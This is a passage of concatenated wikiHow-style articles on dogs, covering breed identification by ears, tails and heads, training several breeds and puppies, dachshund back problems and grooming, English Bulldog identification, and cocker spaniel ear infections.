rather than straight down. You'll see these ears in dogs like Field Spaniels.Filbert-shaped ears hang down, but they have an unusual shape, looking like filberts. You'll find these ears in breeds like Bedlington Terriers.Rose ears are a type of drop ears, but they fold back instead of forward. You see these ears on Greyhounds., Your dog's tail can also be an indicator of its breed. Dog tails come in several varieties.


Curly tails make a little corkscrew. You see this type of tail in Pugs, Akitas, and Chow Chows, for instance.Bobtails are short tails that look cut-off. You see this tail on dogs such as Australian Shepherds and Pembroke Welsh Corgis.Flagpole tails are long and straight and stand up like, well, a flagpole. You'll see these tails on dogs like Beagles.Rat tails hang down, and they have very little hair. These tails are prominent on Irish Water Spaniels and Afghans.You might also see saber tails and sickle tails. Saber tails hang down but curve slightly upward and are covered in fur; German Shepherds have these tails. Sickle tails curve upward over the body and are covered in fur; Siberian Huskies and Chihuahuas have these tails., The shape of your dog's head can also indicate the breed type of your dog. Head shape varies from apple-headed to blocky-headed.Apple heads are very rounded. In fact, they look like domes. These heads are often seen on Chihuahuas.A square-shaped head is known as a blocky head, seen in Boston Terriers.Dogs with noses sunk into their heads and an undershot jaw are called broken-up faces, as seen in Pekingese.Snippy-faced dogs have sharp muzzles that aren't very wide, such as Salukis.Dogs that have faces that are concave are called dish-faced, as seen in pointers.Dogs with down face have convex faces. Their faces are curved outward from the nose to the top of their head, as with Bull Terriers., While you may be able to pull out some of the breeds of your dog just by looking at him, it is difficult to decipher ancestry in mixed-breed dogs. When dogs are mixed, they can produce interesting characteristics that you wouldn't necessarily associate with the original breed."

Never hit or yell at your dog.",How to Train Cavalier King Charles Spaniels," Don't wait to house train your Cavalier. You should begin toilet training him as soon as you bring him home. Take him to the spot where you'd like him to toilet and set him down on the floor or ground.Choose a toileting spot before you bring your dog home and be consistent. Don't change the spot and expect your dog to remember where you'd like him to go.;
, Once your puppy reaches 8 weeks old, he can hold his bladder for only about two hours. To prevent accidents and encourage him to use the right spot, place him on the toilet spot every half an hour or so. You may want to be in the habit of putting him on the spot about half an hour after feedings.Once your Cavalier is 4 months old, he can usually hold his bladder for up to 4 hours.

, If your dog moves his bladder or bowel in the toileting spot, give him lots of praise. Cavaliers respond well to positive reinforcement, so you should encourage him to please you. When he realizes that he gets praise just for toileting in that spot, he'll begin using it just to get the verbal reward.In addition to verbal praise like ""Good job!"", you can also offer treats or let him run around the yard for a while. Cavaliers enjoy the chance to run around and chase birds.

, While you're house training, monitor your dog for signs that he needs to toilet. You might notice your dog sniffing or sidling up to furniture as though he's going to lift his leg. As soon as you see this behavior, set him outside so that he doesn't have an accident in the house.If you won't be home to supervise, put your Cavalier in a crate. He'll be less likely to soil it, so let him outside as soon as you return home.
Cavaliers love company, so they're really a good choice for people who can give them lots of attention., Chances are your Cavalier will have an accident at some point during training. Instead of yelling or getting angry at your dog, ignore the behavior and immediately clean up the mess.Use a cleaning product with special enzymes that completely remove the smell of urine. If your dog continues to smell urine, he'll keep toileting in that spot.

, Choose a crate that lets your Cavalier lie on his side with his legs stretched out, or stand up without banging his head. You should avoid an overly large cage which may not feel cozy enough for your dog. A crate that's restricted in size stops your dog from soiling the space. Give him a comfortable bed and a bowl of water. Encourage your Cavalier to investigate the crate by sprinkling treats inside the bed.The goal is to make a cozy place for your dog to go in order to feel safe and secure. Avoid using the crate as a punishment.
Place a toy or two inside, so that he begins to associate the crate with interesting things.

, Stay home while training your dog to use his crate. Leave the crate door open and let him enter on his own. Once he's inside, feed him a meal. While he's eating, shut the door briefly and tell him how clever he is. Open the door before he begins whining and so he doesn't feel trapped. Over time, increase how long you keep the door shut. This will get him used to being in the crate.Avoid opening the door when he is crying or he will think that crying gets him released.
Leave the door open when he's not inside so that he can come and go if he needs a safe space.

, If you'd like to keep your Cavalier safe and out of the way at night, his crate should be comfortable and in a quiet place. Make sure the crate is out of the way of foot traffic so people's movements won't disturb him. Get him settled in his crate and leave the room while he's not crying.Remember that your dog will need to toilet overnight, especially if he's young. Set an alarm and let your dog out to toilet every 2 or 3 hours.

, Make sure your dog is completely comfortable with the crate before you start leaving him alone in it. Once your Cavalier is comfortable being left alone for 30 minutes at a time, you can begin gradually increasing the amount of time he's left alone. Never make a big deal when you leave or return and always let your dog out to toilet once you come back.Never crate your dog for more than 4 hours at a time (unless it's overnight). Younger dogs can only handle an hour or two while dogs that are 15 weeks or older can usually do 3 or 4 hours.

, It's important to give your Cavalier new experiences, especially while he's still very young (before 18 weeks old). He'll consider the new sights and sounds to be normal which can help build his confidence. This socialization will also prevent over-anxious behavior as he gets older.Make sure your Cavalier meets a wide range of people, dogs, and experiences. You can take your dog to a socialization class run by your vet or a reputable trainer in the area.

, Train your Cavalier in small doses and often. Keep the sessions to five minutes at a time and do them three times a day. Your dog will respond better to this than if you do one long half-hour session. Choose a time when your dog isn't hungry or tired, so he pays attention. Stop the session if he looses interest.Always try to end on a positive note, with a command you know your dog can do.

, Use a clicker to teach your dog to associate a click-clack sound with receiving a reward when he obeys a command. Practice by throwing a treat on the floor and let your Cavalier eat it. As soon as he goes to the treat, press the clicker. Repeat this till he associates the click-clack sound with looking for a treat. Start giving commands and when he obeys, press the clicker as his reward.For example, when your Cavalier toilets outside, immediately press the clicker so he knows he's being rewarded for toileting in the right place.

, When you use the clicker training, always start with a verbal command word. For example, say ""Sit"" and click once he follows the command. Once he's comfortable following verbal commands with the clicker reward, stop using the clicker, but continue to use verbal commands.


For example, you could run a few steps away from your Cavalier while slapping your leg and calling his name. He'll instinctively want to keep close to you, so this is good practice in responding to his name.

, Your Cavalier will only associate punishment with you instead of the action you dislike. This can damage your relationship, actually making it harder to train him. Instead, use positive reinforcement with verbal praise and rewards like treats or exercise.If your dog misbehaves, you can firmly say ""No."" Avoid giving him a lot of attention or telling him off. Any attention is a reward for your dog.
If your Cavalier grabs something he shouldn't and you haven't trained him to give it back, distract him with a toy or some food. Take the object while he's distracted.

Keep training sessions short.,
Reward good behavior.,
Ignore bad behavior.,
Consider working with a certified professional dog trainer.",How to Take Care of a Dachshund2," For the best results, train your dachshund during three five minute sessions every day. Keeping training sessions short will help your dachshund to remain attentive. The frequency will help reinforce what you want your dachshund to learn., In order to get your dachshund to do what you want him to do, you need to reward his good behavior as soon as he does it. For example, if you ask you dachshund to sit and he complies, immediately offer him some praise and petting to let him know that he did something good. You should reward your dachshund whenever he does good things so that he knows that these are the behaviors you like., You help your dachshund to understand what you do not want him to do by simply ignoring the bad behavior or withholding the reward. For example, if your dachshund wants to go for a walk and he is sprinting around the house because he is so excited, ignore him and wait until he stops to put on his harness. When he stops and stands still, put on his harness and take him for a walk. Do this every time you walk your dachshund to help him understand what you do not want him to do. He will learn that running around does not lead to a walk, but standing still does., If you have trouble getting your dachshund to follow your commands, consider hiring someone to help you train your dog. A certified professional dog trainer can help you to train your dachshund. This may be especially helpful if you are struggling to correct bad behaviors.You can also look for group training classes in your area if you’d like to provide some socialization for your dachshund as well.

Well-bred Rottweilers are large and athletic. Male Rottweilers can grow up to 27 inches tall at the shoulder and weigh 100 – 135 pounds. Female Rottweilers are slightly smaller: up to 25 inches tall at the shoulder and weighing 80 – 100 pounds.Rottweilers have a thick, glossy black coat with tan patches on the body. You should brush the coat every few days to keep it glossy and healthy.Rottweilers were originally bred to herd cattle, protect their owners and guard resources. Because of this, they got the name “butcher’s dog.”;
, Before you can train your Rottweiler, it’s important to learn about the temperament of the breed. While they are loyal and loving, they can also be aggressive. Understanding your Rottweiler will help you successfully train it.


Rottweilers are very social animals and bond well with their human family. They don’t like to be left alone or isolated.It’s not uncommon for them to have separation anxietyRottweilers need a lot of physical and mental stimulation. Long walks and obedience training sessions will stimulate them and help prevent destructive behaviors such as digging, chewing, and whining.Rottweilers are naturally territorial and will be very protective of you.Rottweilers may act dominantly towards other animals and people. Proper training, which includes socialization, will help minimize this behavior.Rottweilers may exhibit aggressive behavior if they are trained that this is acceptable behavior or if they are not trained properly.Rottweilers reach maturity very slowly, usually at the age of two. This can mean they will be hyperactive and mischievous for a longer period than other dogs. They may also chew on articles more frequently until they reach maturity., Develop a training plan that you can follow consistently. Making a plan will give you a chance to consider your dog’s personality and different factors that may affect the process, such as if your Rottweiler is older or a puppy.


When developing your training plan, make sure to keep your Rottweiler’s personality in mind. If there are certain areas of behavior with which he has difficulty, focus on those.
Since training is something you need to do regularly and over time, set short, mid and long term goals. You can develop your plan by setting daily, weekly, and monthly intentions or goals for you Rottweiler. By taking the time, if necessary, to teach your dog lessons, you will ensure that your dog is obedient and understands the lessons you’ve taught him.
For example, you could have the goal one week of socializing your Rottweiler. Make a plan over the course of the week to expose your dog to other dogs and people. Remember to keep the activities short, like a walk to the dog park, followed by a reward if your Rottweiler behaves and then walk or run home.
It’s important that you can commit ample time over a longer period to training your Rottweiler. Dog training doesn’t happen overnight and requires consistency.

, If you don’t have the time to commit to training your Rottweiler consistently and properly or if your dog is having specific issues, consider hiring a professional trainer. Often, a professional will be able to address an issue that you cannot. Professional trainers will ensure your dog is obedient, but you will still need to use commands consistently and undertake top up training so as to keep it fresh in the dog's mind.


If you have an older Rottweiler or even a rescue that has been traumatized, they may have specific behavioral issues that need addressed by someone who understands how to handle these situations. Learn from the trainer what your problems are and the solution, so you can apply this consistently at home.
Puppies may also be averse to training and require professional training.
You may also want to use a professional to help reinforce your training methods and correct you where you are having difficulties.
Consult the local chapter of the American Kennel Club or the AKC’s website to find obedience training programs for your Rottweiler.

, In order to train your Rottweiler most effectively, you want to start training him as early as possible to establish acceptable behavior. From puppies to older dogs, Rottweilers respond well to training with the proper guidance from early on in your relationship.


Start training immediately. No matter how old your Rottweiler is, you will be most successful if you start training him early.You will be most successful if you train your Rottweiler between the ages of 6 weeks and 6 months.If you got your Rottweiler at an older age, it’s important to not be discouraged. You can train him as soon as he joins your family. Just know that it may take a little more time, effort, and patience on your part.Remember that Rottweilers are intelligent, obedient, and loyal companions that want to make you happy. Proper communication with your Rottweiler will help you to train him at any age., When you train your Rottweiler, you want to establish rules that he will follow so that he behaves properly. By understanding that dominance in the relationship with your Rottweiler doesn’t mean dominating him, you are more likely to encourage the behaviors you seek.


Dominance means establishing rules your Rottweiler will follow by reinforcing them with a firm voice or hand motions that indicate he is a member of a pack that you lead. You can be dominant and firm while being kind and careful with your Rottweiler. For example, the best way to establish this dominance is to take your Rottweiler for a walk on a leash and have him heel beside or behind you.Don’t dominate your Rottweiler through verbal or physical aggression. This will will only cause him to fear you and undermine your training plan., Rottweilers can exhibit aggressive behavior at any age. Rottweilers can get aggressive with people and other dogs. Identifying aggression and actively managing it with training can help prevent your Rottweiler exhibiting this behavior in the future.


A Rottweiler may not show aggression immediately because he is an observer by nature. The signs of aggression may be discreet and your Rottweiler may even seem calm. Ignoring even subtle signs of aggression, such as staring, can lead to later problems.There are different signs of aggression in a Rottweiler including a low growling noise, showing teeth, snapping the jaw, or staring.If you see your Rottweiler quietly staring at something, this is a sign of aggression. Remove him from the situation to calm him down and avoid potential problems.
A Rottweiler will exhibit aggression for different reasons such as protecting his territory, as well as being territorial with food or with an owner.A Rottweiler may show aggression towards other dogs, such as growling or barking, because he thinks he is protecting you.Fear is a primary reason of aggression in Rottweilers. It can be a trained behavior.For example, if a man with a beard verbally or physically punished your Rottweiler, this may have traumatized him and he may exhibit aggressive behavior when he sees any man with a beard.Manage aggression by quickly neutralizing the situation in a calm manner.If you get upset with your Rottweiler, you may compound his anxiety and aggression.Manage your Rottweiler’s aggression by exposing him to triggers in a controlled environment. This will help reduce his fear and help minimize aggressive behaviors.For example, if your Rottweiler fears men with beards, have him meet a friend or family member who loves dogs and can show your Rottweiler that he doesn’t need to be scared of everyone with facial hair.If your Rottweiler if exhibiting aggression towards you, leave the situation and don’t confront your dog.Never chastise a Rottweiler for growling. This will inhibit the behavior (growling) but not remove his underlying feelings of tension. Thus the dog may learn to bite without first warning of his intention because he feels inhibited about growling.

, One important component of training your Rottweiler is exposing him to other dogs and people. This will keep him happy and comfortable in any situation, and less likely to be aggressive. It will also make him more receptive to your training.


Rottweilers may act dominantly towards other animals and people and this behavior can be prevented with proper socialization.Help your Rottweiler be comfortable around both dogs and people by exposing him to positive situations with other dogs and individuals.
Socialize your Rottweiler by taking him for walks, to play the dog park, and to visit friends. It’s also important to invite people to your house so that your Rottweiler is comfortable having people on his territory.Keep every aspect of socialization calm and positive, which will teach your Rottweiler to be calm and confident., Dogs have a very short attention span and a short memory, so keep training sessions short. Combine training sessions with activities such as socialization and mealtimes.


Keep training sessions at about 15 minutes.Know that Rottweilers distract easily, so be patient if your dog makes a mistake.Combining training sessions with other activities is a great method to reinforce the lessons you’re teaching. For example, if you have your dog at the park, it’s a good way to teach him commands such as “come.”

, Patience is the most important and hardest part of training a Rottweiler. Remember that your dog wants to please you. If you are calm and happy, your Rottweiler will be calm and happy.You will be most successful at training your Rottweiler if you are patient with him. If you keep the training fun for both you and your Rottweiler, you’re more likely to be patient with him.
Training for any dog is a lifelong process.Yelling or physical punishment will only counteract your training process, and also may cause your dog to fear you and other people., Rewarding your dog for his positive behaviors is an integral part of the training process. Understand that your Rottweiler will make occasional mistakes and that you must avoid physical discipline or yelling at him in these situations.


Positive reinforcement trains your dog by rewarding the actions you want him to repeat.Reward your Rottweiler with treats, toys or praise. When you are teaching him a command and he performs it well, immediately give him his reward.Be careful with food rewards so that your Rottweiler doesn’t get fat or become unhealthy.Rottweilers are going to make mistakes and you should never use physical discipline during training. If your Rottweiler doesn’t perform a command, take a break and then ask him perform it properly. You can reward him after he follows the command to your liking.
It is counterproductive to verbally or physically punish your Rottweiler. This will only cause him to be fearful and confused and may even discourage him from learning the command., Because Rottweilers have short term memories and are distracted easily, it’s important to react to your dog’s behaviors promptly. You will reinforce your training methods by doing this, and also ensure that your Rottweiler doesn’t fear because you disciplined him for a behavior that he can’t remember.


For example, if your Rottweiler does something you like, such as following a command, it’s important to reward him immediately so he understands that this is the type of behavior you like.
Don’t punish a Rottweiler for going to the bathroom in your home unless you see him do it. He won’t remember the behavior. If you do see him go to the bathroom in your home or another inappropriate place, a firm “no” is all that is necessary to teach him this behavior is wrong., In order to complete your Rottweiler’s training, teach him simple commands by using positive reinforcement. This will help ensure that you have an obedient and well-behaved Rottweiler.


Use short one or two word commands together with hand signals so that your dog understands your command voice and the motion he needs to make., “Sit” is the first command to teach your Rottweiler because it will make activities like feedings and grooming much easier.


Get your dog to focus his attention on your hands so that he is more likely to listen to the command. Say sit and lightly push his behind to get him to sit.Hold a treat in front of your dog’s nose and guide her into a sitting position. When her bum hits the floor say “yes” or “good job” and give her the treat. Repeat this process until your dog follows the command., Make sure to use “no” in your disciplining voice and don’t overcomplicate it with words your dog won’t understand.Your disciplining voice should be firm and lower toned.
To teach “no”, place a treat on the floor and when your dog tries to eat it, make a loud noise and remove the treat. If you repeat this, your dog will associate taking the treat with a startling sound and not try the behavior.You can reinforce this lesson by asking him to sit, for example, and following it up with a treat.Only use this command when you catch your dog doing something bad. Move on when he stops or say it again and remove him from the situation., Remembering that Rottweilers are social and want to be with you will help you stay patient with your dog.Call your over to a space where you’d like them to stay. Then move away and say “stay” and toss them a treat. Repeat this over the course of a few days.Make sure to reward him when he follows the command properly.

, Your Rottweiler will also love this command because it means that he can be with you, something this loyal and social breed loves.


For example, have your family members call your dog from around a room by saying his name and “come!” Encourage your Rottweiler to come by clapping, or making other noises she likes. When she comes to you or your family members, say “good boy” and give him a tasty treat. Then someone else can call him.Make sure to reward him when he follows the command properly.

, Housebreaking a dog can be one of the most frustrating aspects as an owner, but a very necessary activity. But with consistency, patience, and some positive reinforcement, you can housetrain your Rottweiler with relative ease.


Be consistent with taking your Rottweiler outside. Puppies need to be taken out every 20 – 30 minutes during the day and adults should be taken out every hour or two. Take her to an area that you’ve designated their “potty spot” and with her leash on, say “go potty.” Keep encouraging her until she goes and then give her huge praise and a treat to let her know that she’s done a good job.Take your Rottweiler back inside as soon as she’s done going to the bathroom so she knows that going outside means she needs to go to the bathroom.Repeat this process every hour or two until your Rottweiler is housebroken.Don’t worry if your dog does not go to the bathroom right away or at all. She may not have to go. Just keep repeating the process until she’s house trained.Your dog will inevitably make a mess during the housetraining process. When this happens take her outside to the potty spot. Then thoroughly clean up the mess to remove any lingering odor that would draw her back. Do not punish the dog for going to the toilet indoors after the event, as she will link the punishment to you rather than the action.Whatever you do, never yell at or hit your Rottweiler for making a mess, which may make them continue going to the bathroom inside your home., In general, obedience training will help ensure that your Rottweiler doesn’t bite, bark, or jump on people. Properly socializing your dog and telling them “no” when he’s done something he wasn’t supposed to will help avoid these behaviors immensely, but there are a couple of other tips you can use, too.


You can minimize digging, chewing, whining and many other destructive behaviors through leash walks and by giving dogs chew toys.If your Rottweiler exhibits undesirable behavior such as above, distract him with a squeaky toy to divert his attention. A short ""No"" is acceptable, immediately before the distraction, so he begins to understand right from wrong. However, be aware that chastisement can be an accidental reward (your attention) so the dog may be more (not less) likely to repeat the behavior in order to get your attention. If they do not stop the behavior, remove them from the situation."

Get to know your puppy.,
Choose a name with one or two syllables.,
Select a name with distinguishable sounds.,
Avoid names that rhyme with frequently used words.,
Find a place to begin training.,
Plan training sessions.,
Call your puppy’s name in a happy, clear voice.,
Reward your puppy if he responds to his name.,
Make training more challenging.,
Stop giving treats gradually.,
Use the puppy's name continually.,
Give it time.",How to Teach a Puppy Its Name," Spend a few days with your puppy before deciding on a name. Play with him and see what he likes or dislikes. For example, during which activities does he wag his tail or seem excited? In which moments does he seem withdrawn? Are there particular foods he prefers? After some time, you both will be more comfortable with each other. You might draw a name from his personality traits or habits. If your dog has lots of energy, you could name him Sparky for instance.


It is important to teach your puppy his name before you begin teaching commands. Having your puppy know his name will help the training process.;
, A puppy's name should produce a quick response. Dogs respond better to short sounds. For example, ideal dog names are Bella, Buddy, or Lucky. Use a name that you will not mind repeating endlessly. Allow household members to contribute to the naming process. If you have small children, consider picking a shorter name that they can say., By having easily identifiable sounds in the name, the puppy can differentiate his name from surrounding noise. Utilize names with crisp, commanding consonants (“k” or hard “c”) like ""Cocoa."" Sibilant consonant or blends (“s,” “sh” or “zh”) in names like ""Shadow"" also help dogs hear their names. Consider names like BeeBee with distinct vowel sounds., For example, do not choose a name that rhymes with a household member's name (e.g. Jim, name: Tim), an oft-used word (No!, name: Bo), or command (Stay, name: Shay). If the name sounds too close to another word, the dog might be confused. Your dog does not understand the meaning behind his name. Instead, your puppy responds in a particular way to a certain sound., You can train in your home in the kitchen or living room. A backyard or a quiet outdoor space where there are no distractions also works. Your puppy can be on or off his leash to start.

, Dogs have short attention spans. For this reason, it is best to plan more frequent, shorter training sessions. Plan five minute training sessions with three to five ""name calls"" during different times of the day. Practice over the course of a few days., Use your puppy's name one time per exercise (e.g. Come, Molly!). If you repeat the name continually before the dog comes, he will tune the name out.Use the puppy's name with positive commands.


Consider running away from your puppy while you call his name. Dogs love to chase things and might be more likely to follow you.Use the Name Game to practice name recognition. In the training area, keep him on a ten-foot leash. Give him five feet to wander. When he is not looking, call the puppy with an excited voice. Make sure he comes to you. If he does not come, pull him gently towards you. When he gets to you, praise him and give him a treat. Repeat the exercise until your puppy consistently returns to you when you call his name.Do not use the puppy’s name in conjunction with negative commands or words (no and stay). No not scold the puppy if he comes even if he took awhile.Avoid nicknames that might confuse your dog., Say, ""yes!"" when he comes.Give him verbal praise and/or a treat. Overall, act very excited and pleased about his behavior. You also could give your dog a belly rub. You can alternate what rewards you give the puppy. The goal is to associate puppy's obedience with a positive response from you.

, After your puppy has mastered initial training, train in different locations. Throw in a distraction like a bouncing ball, then call its name. Practice while your puppy is playing, chewing, grooming, sleeping, etc.Aim to have your puppy respond to you no matter where you are.

, Once your puppy consistently responds to his name, slowly stop giving him treats (for name response). Give him a treat every other time he responds. Lengthen the time between treats until he no longer needs treats for name response.

, Once you are done training, continue using the puppy's name frequently. Say it when you walk, feed, bathe, or groom him. Say his name during positive moments.

, If it takes a while for your puppy to learn his name, that is okay. Each dog learns at his own pace. The key is to be consistent in saying his name. Over time, he will learn to understand that when he hears his name, you want his attention.


Remember that no dog will respond to his name 100% of the time. Dogs are not machines and thus make errors. They might not hear you or they might have a bad day and not want to listen.Some dog breeds like hounds are more difficult to train than other breeds. Be extra patient."

Consider purchasing a doggie wheelchair for your dachshund.",How to Treat Back Problems in Dachshunds," Back problems in dachshunds are actually spinal problems.Intervertebral discs, located between the vertebrae (bones in the spine), contain a gel-like substance that helps them act as shock absorbers. As your dachshund ages, these discs can harden and lose their shock-absorbing ability, causing the gel-like substance to squeeze out and compress his spine, causing pain and other problems.High-impact activities (e.g., running, jumping), excess body weight, and irresponsible breeding can increase the risk of back problems in dachshunds.Although IVDD is very common in dachshunds, back problems in this breed can be caused by infection (e.g., meningitis), spinal tumors, and trauma.;
, Back problems can affect your dachshund’s ability to walk normally. For example, IVDD can make your dachshund very wobbly when she walks, or unable to walk at all.Even if your dachshund can walk, the pain caused by IVDD may make her reluctant to move.Spinal trauma or a spinal tumor may make walking difficult or impossible for your dachshund.

, If your dachshund has back problems, his posture may change. If he has IVDD, his neck or back muscles will be very tense and he will start hunching these muscles.These tense muscles may start having spasms.The spasms will look like small, fast movements in the muscles. Each spasm could be quite painful for your dachshund.
Your dachshund’s posture could be affected in similar or different ways with the other causes of back problems.

, Your dachshund will probably have pain and discomfort from her back problems. For example, IVDD may cause her to cry out in pain or seem anxious. She may also start eating less and be less willing to do the activities she used to do, such as playing or going out for walks.These changes would reflect a decrease in your dachshund’s quality of life.

, With severe back problems, a dachshund can lose control of his bladder or intestines, causing inappropriate urination or defecation.This loss of control, called incontinence, is a sign of a neurologic problem—damage to the spinal nerves controlling urination and defecation.


Lower back trauma can cause spinal damage.

, To diagnose your dachshund’s back problems, your vet will evaluate your dachshund’s symptoms and perform several tests. For example, if your dachshund’s rear legs are weak or paralyzed, your vet will do a neurologic exam to identify where the spine is damaged.A neurologic exam involves pinching the toe or tail to determine if deep pain can be felt (indicated by a bark or head turn).Imaging studies are very important in diagnosing back problems in dachshunds. Plain x-rays would show vertebrae, but not the discs or spinal cord. Other imaging methods, such as magnetic resonance imaging, computed tomography, or myelography, would be more useful.For myelography, your vet would anesthetize your dachshund and inject a dye into his spine. This dye would make it easier to see the spinal cord on an x-ray.Imaging studies can help your vet determine if trauma or other diseases are causing the back problems.If your vet suspects a spinal infection, they would take a sample of fluid from your dachshund’s spine and have it analyzed to identify the ‘culprit’ organism., Treatment for back problems in dachshunds is either medical (non-surgical) or surgical. Depending on the cause and severity of your dachshund’s back problems, your vet may recommend medical therapy. For example, if your dachshund’s IVDD is mild, then medical therapy would probably work.If she has a spinal infection (e.g., discospondylitis, an infection of the vertebrae and discs), then medical therapy could be effective.Examples of medical therapy are pain reduction, cage confinement, weight management, and antibiotics.

, Your dachshund will start feeling much better when he’s in less pain. Your vet will prescribe a pain medication, either steroids or non-steroidal anti-inflammatory drugs (NSAIDs), to reduce the pain and inflammation in your dachshund’s back and spine.Reducing your dachshund’s pain will be important, regardless of his specific back problem.


Since NSAIDs can cause gastrointestinal bleeding and other digestive problems, they should be given with care and following your vet's instructions and always with or after food.Steroids could cause your dachshund to gain weight, among other problems (e.g., weakened bones, liver problems).Steroids cannot be given with NSAIDs.

, If your dachshund has IVDD, her back or neck muscles may spasm. To relieve these spasms, your vet will prescribe a muscle relaxant. Heat and massage can also relieve muscle spasms., If your dachshund has a spinal infection, he would need treatment that would kill the culprit organism. This treatment may be an antibiotic, an antifungal medication, or another type of medication, depending on the organism., Cage or crate confinement is especially important for treating mild cases of IVDD, since the confinement would give the damaged disc(s) a chance to heal. Confinement could last anywhere from two to six weeks.Your vet will advise you on the length of confinement.


If you have already crate trained your dachshund, then her confinement shouldn’t be too difficult to manage. If she is not crate trained, try to keep her as still and quiet as possible in her normal sleeping area.
Being confined to the cage or crate could be very lonely for your dachshund. Make sure you continue to talk to her and interact with her during her confinement period.
Cage confinement may not be necessary for all back problems. Your vet will let you know if your dachshund’s specific back problem will require confinement.

, Excess weight on your dachshund puts more pressure on his back.If you have been feeding more than the recommended amount of food to your dachshund, then you will need to reduce his food intake. Work with your vet to determine how much food your dachshund should eat per day, and measure this amount of food with a measuring cup.Consider eliminating all treats from your dachshund’s diet, especially store-bought dog treats.
Specially-formulated weight loss diets could help your dachshund lose weight without missing out on important nutrients.

, Surgical treatment may be ideal for some back problems. For example, if your dachshund has IVDD that has not responded to medical therapy, then your vet would perform a surgery to remove the extruded disc material. This would decrease pressure on the spinal cord and allow it to heal.Surgery may be possible to remove a tumor, depending on its size and location.If your dachshund has spinal trauma, immediate surgery may help; however, the trauma (and other injuries) may be too severe for your dachshund to withstand surgery.
Your vet will discuss all surgical options with you and let you know if your dachshund would be able to handle the surgery.
Your vet may refer you to a veterinary neurosurgeon.

, If your dachshund has surgery, then you will need to care for her at home to ensure she has a full recovery. In general, at-home care involves pain reduction, exercise restriction, and physical therapy (if possible). Realize that a successful surgical outcome (e.g., pain relief, ability to walk) may not be apparent for several days to weeks after surgery.You may have to express your dachshund’s bladder after surgery. Your vet can show you how to do this.

, If your dachshund’s back problem has left his rear legs paralyzed, he may need a doggie wheelchair so he can get around.As your dachshund recovers from surgery, he may no longer need the wheelchair. Ask your vet for recommendations on wheelchairs and how to use one.

Examine bulldog breeds.,
Look at pictures.,
Differentiate between types of English Bulldogs.",How to Identify an English Bulldog1," There are a number of bulldog breeds out there, many of which share similar physical characteristics due to having the same heritage. Look at an online breed guide or purchase a guide at a local pet store to help you recognize different types of bulldogs.English bulldogs are easily confused with other short, squat forms of bulldog such as the Victorian Bulldog, the Dorset Olde Tyme Bulldog, and the the Aussie Bulldog.
Take a look at body shapes. Some bulldogs have lean, muscular bodies and longer noses and faces. These types of bulldogs, such as the American Bulldog and the Banter Bulldogge, look more like pit bull type dogs than they do a short, round English Bulldog.
French bulldogs are often smaller than English bulldogs, and have upright, pointed ears.;
, Go online or look for resources at your local pet store with pictures of different types of bulldogs. Seeing representations of different types of bulldogs can help you learn what to look for in an English bulldog.Put pictures of similar bulldogs side-by-side and take a close look to find some of the differences. Look at body shape, facial features, ears, and tail to help give you an idea.

, There are two types of English Bulldogs out there, and while they can look similar, they have some differentiating features. The Olde English Bulldogge is known for being larger, taller, and somewhat more muscular than its modern cousin.Despite the name, Olde English Bulldogs are still actively bred and raised today. It is possible to come across both an English Bulldog and an Olde English Bulldogge at a rescue or with a breeder.
Olde English Bulldogs have been cross-bred with bull mastiffs, pit bulls, and American bulldogs to help keep them healthier and avoid some of the complications common amongst regular English Bulldogs.

Wash your dachshund.,
Brush your dachshund.,
Clip your dog's nails.,
Inspect for problems.",How to Take Care of a Dachshund3," Use special dog shampoo to wash your dachshund. If your dog has short hair, you should give your dog a bath once every three months. If your dog has long hair, you may need to bath her more frequently. Use a spray hose and wet all of your dog’s fur, but do not wet the areas around her eyes, ears, and nose. Then massage the shampoo into your dog’s fur. Rinse all of the shampoo out and then dry her off with a towel.Offer your dachshund plenty of praise and a treat after baths to help him to associate bath time with good things.

, If your dachshund has short hair, you may only need to brush him once a week. If your dachshund has long hair, you will need to brush him daily to avoid tangled and matted fur. Use a wide comb to help remove tangles before moving on to a brush. Make sure that you offer your dog lots of praise while you brush him and give him a treat when you are finished so that he associates brushing with good things., To clip your dachshund’s nails, you will need a special nail clipper for dogs. You can purchase one in a pet store. You may also need to get your dachshund used to you handling his nails before you try to clip them. If your dachshund is wary of you touching his feet and nails, help him get used to it by petting his feet and touching his toes. Give him praise and a treat when he lets you touch his toes. After he becomes comfortable with you touching his feet, you can try to clip his nails.Make sure that you do not cut too far down or you may hit the quick of his nail. This area is very sensitive and may cause bleeding.
If you are concerned about hurting your dog while trimming his nails, ask your vet to show you how or have a professional groomer trim your dog’s nails.

, Grooming time is a good time to check your dog for fleas, ticks, and other potential health problems. Make sure that you inspect your dog’s skin for any unusual growths, wounds, or tender areas. You should also check your dog’s ears for excessive wax buildup and foul odors. If you find anything that seems abnormal, schedule an appointment with your veterinarian as soon as possible."

Follow treatment instructions exactly.,
Clean your cocker spaniel’s ears properly.,
Do not use irritating or homemade ear cleaning products.",How to Treat Ear Infections in Cocker Spaniels," Your cocker spaniel’s discomfort with his ears will be obvious. For example, he will shake his head, scratch his ears, and be sensitive to touch on his head or around his ears.In addition, he may rub his ear against a piece of furniture. If his discomfort his severe, you may hear him cry out when he scratches his ears.Excessive head shaking can create a large blood clot in the ear, called an aural hematoma.;
, Ear infections typically produce a strong, foul odor.If your cocker spaniel will let you touch his ears, lift the flap of one ear and sniff inside the ear. It won’t take long for an unpleasant smell to reach your nose.


An ear infected with the bacteria Pseudomonas will have a swamp/pond water smell., If your cocker spaniel will let you, look inside his ears. The ears will look red and inflamed.You may also see scaly skin.If your cocker spaniel’s ears contain mites, you wouldn’t be able to see them because they are so small. However, you would be able to see evidence of their irritation: dark, coffee ground-like bumps., Depending on the ear infection's cause (bacteria, yeast, ear mites), you may see discharge exiting the ears. The discharge will be one of a few colors, such as yellow or brown, and have a certain consistency. For example, discharge will be brown and crumbly with ear mites; Pseudomonas will produce a yellow/green pus.The discharge may also be waxy or contain blood., Do not delay in getting your cocker spaniel to your vet—untreated ear infections can spread from the outer ear (what you can see) to the middle and inner ear (what you can’t see), becoming much more difficult to treat.Your vet will examine the ears to determine the ear infection's cause and assess how much pain and discomfort your cocker spaniel is experiencing.To diagnose the ear infection, your vet will use an otoscope to look in the ears, gently touch and manipulate the ears, and take samples to analyze under the microscope.If your cocker spaniel’s ears are extremely painful, or the ear canal is very narrow, your vet will need to sedate your cocker spaniel to examine his ears.
Other health conditions, such as food allergies, can lead to ear infections by causing excessive ear scratching.If your cocker spaniel has chronic ear infections, your vet may recommend doing a food trial to identify the allergy-causing ingredient.

